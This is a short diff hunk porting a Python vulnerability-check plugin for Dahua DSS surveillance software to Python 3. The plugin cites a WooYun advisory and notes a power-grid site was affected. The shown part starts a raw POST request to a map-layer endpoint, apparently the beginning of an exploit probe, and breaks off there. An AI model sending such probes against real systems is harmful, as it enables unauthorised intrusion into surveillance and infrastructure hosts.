@@ -11,12 +11,12 @@ refer     ：WooYun-2015-151421
 top2的监控产品供应商的用户量可想而知
 国家电网某站也中枪
 """
-import urlparse
+import urllib.parse
 import re
 
 def assign(service, arg):
     if service == 'dahua_dss':
-        arr = urlparse.urlparse(arg)
+        arr = urllib.parse.urlparse(arg)
         return True, '%s://%s/' % (arr.scheme, arr.netloc)
 def audit(arg):
     raw="""POST /emap/bitmap/bitMap_addLayer.action?jsonstr={%22mapx%22:null,%22mapy%22:null,%22name%22:%22%22,%22path%22:%22%22,%22desc%22:%22%22,%22pId%22:null} HTTP/1.1
